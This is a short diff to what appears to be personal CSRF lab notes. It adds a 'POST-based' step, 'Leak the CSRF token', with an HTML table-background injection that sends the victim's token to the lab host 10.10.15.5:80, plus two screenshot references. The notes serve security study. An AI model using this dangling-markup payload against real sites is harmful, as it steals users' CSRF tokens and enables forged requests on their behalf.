@@ -44,7 +44,13 @@ While logged into the target user account, open a new tab and visit the URL host
 
 # POST-based
 
+![[Pasted image 20241012110824.png]]
+
+Leak the CSRF token,
 ```html
-<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
+<table%20background='%2f%2f10.10.15.5:80%2f
 ```
+
+![[Pasted image 20241012110926.png]]
+
 
